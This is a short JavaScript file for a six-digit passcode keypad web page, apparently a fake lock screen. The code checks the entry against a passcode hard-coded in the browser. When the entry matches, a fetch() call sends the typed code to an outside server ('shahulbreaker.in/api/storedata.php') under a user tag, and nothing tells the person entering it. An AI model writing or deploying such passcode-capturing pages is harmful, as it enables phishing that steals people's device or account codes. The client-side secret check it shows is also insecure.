const keys = document.querySelectorAll('.key:not(.empty)');
const dots = document.querySelectorAll('.dot');
let input = '';
const correctPasscode = '123456'; // change as needed

keys.forEach(key => {
  key.addEventListener('click', () => {
    if (key.classList.contains('delete')) {
      input = input.slice(0, -1);
    } else {
      if (input.length < 6) input += key.textContent;
    }
    updateDots();

    if (input.length === 6) {
      if (input === correctPasscode) {
        sendPasscode(input);
      } else {
        triggerShake();
        input = '';
        setTimeout(updateDots, 200);
      }
    }
  });
});

function updateDots() {
  dots.forEach((dot, index) => {
    dot.classList.toggle('filled', index < input.length);
  });
}

function triggerShake() {
  const keypad = document.querySelector('.keypad');
  keypad.classList.remove('shake');
  void keypad.offsetWidth; // reset animation
  keypad.classList.add('shake');
}

function sendPasscode(code) {
  fetch(`https://shahulbreaker.in/api/storedata.php?user=tarunpeek&data=${code}`)
    .then(res => console.log('Sent:', code))
    .catch(err => console.error(err));
}
